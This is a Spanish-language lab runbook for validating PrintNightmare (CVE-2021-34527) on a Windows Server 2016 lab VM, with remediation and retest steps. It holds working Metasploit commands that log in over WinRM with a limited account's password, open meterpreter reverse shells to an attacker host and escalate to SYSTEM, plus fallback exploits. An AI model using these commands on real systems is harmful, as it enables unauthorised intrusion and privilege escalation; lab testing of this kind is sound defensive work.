# S2 · PrintNightmare · CVE-2021-34527

## 1. Ficha

| Campo | Valor |
|---|---|
| VM | M4 `10.10.10.14` |
| Servicio | Print Spooler |
| Sistema | WS2016 build 14393 |
| Rango vulnerable | builds bajo umbral con Spooler activo |
| Versión que corrige | KB de PrintNightmare / Spooler off |
| CVSS | **8.8** v3.1 |
| CWE | CWE-269 |
| NVD | https://nvd.nist.gov/vuln/detail/CVE-2021-34527 |
| Estado | **Válida con cambio**: usuario limitado `soporte` + MSF local |

## 2. Precondiciones

- Spooler activo.
- Usuario **limitado** `soporte` con WinRM (no Administradores).
- Sesión de Metasploit como `soporte`.
- Módulo local de PrintNightmare.

## 3. Flujo

1. Snapshot M4: `previo-a-S2`.
2. Verificar Spooler y `soporte`:

```powershell
Get-Service Spooler
net user soporte
net localgroup "Remote Management Users"
```

3. Comprobar acceso limitado desde M1/pivote:

```bash
nxc winrm 10.10.10.14 -u soporte -p 'Soporte123!' -x whoami
# Esperado: srvold\soporte
```

4. Obtener sesión de Metasploit como `soporte`:

```text
use exploit/windows/winrm/winrm_script_exec
set RHOSTS 10.10.10.14
set USERNAME soporte
set PASSWORD Soporte123!
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.20
set LPORT 4445
run
```

5. Ejecutar el privesc local:

```text
use exploit/windows/local/cve_2021_1675_printnightmare
set SESSION <ID>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.20
set LPORT 4446
run
getuid
```

6. Esperado:

```text
NT AUTHORITY\SYSTEM
```

## 4. Evidencia

- `EV-S2-01`: `whoami` = `srvold\soporte` antes.
- `EV-S2-02`: `getuid` = SYSTEM después.
- `LOG-S2`.
- Snapshot `previo-a-S2`.

## 5. Impacto y siguiente salto

- Cumple el **privesc obligatorio de M4** desde acceso limitado.
- SYSTEM en el Windows heredado.
- Acceso a `legacy`, SAM y servicios.

## 6. Fallback

- Si el módulo local falla, probar:
  - `exploit/windows/dcerpc/cve_2021_1675_printnightmare` desde M1 (no M6).
  - Otro LPE de WS2016 (CVE-2021-1732, CVE-2020-0787).
- Si no hay LPE, documentar la limitación; **no** declarar admin→SYSTEM como privesc.

## 7. Remediación

```powershell
Set-Service Spooler -StartupType Disabled
Stop-Service Spooler
# o instalar el KB de PrintNightmare
```

## 8. Retest

```powershell
Get-Service Spooler   # Stopped / Disabled
```

```text
# Mismo módulo: debe fallar
```

## 9. EARS

- **REQ-S2-01 (Evento).** CUANDO se valide S2, el laboratorio DEBE partir de `soporte` y capturar `NT AUTHORITY\SYSTEM`.
- **REQ-S2-02 (No deseado).** SI el SYSTEM se obtiene con credenciales de admin, ENTONCES NO DEBE declararse privesc.
- **REQ-S2-03 (Ubicuo).** La remediación DEBE deshabilitar/parchear el Spooler y el PoC DEBE fallar.

## 10. Checklist

- [ ] Snapshot `previo-a-S2`.
- [ ] Spooler activo.
- [ ] `soporte` limitado + WinRM.
- [ ] Sesión `soporte`.
- [ ] `getuid` SYSTEM.
- [ ] Evidencia.
- [ ] Remediación.
- [ ] Retest.
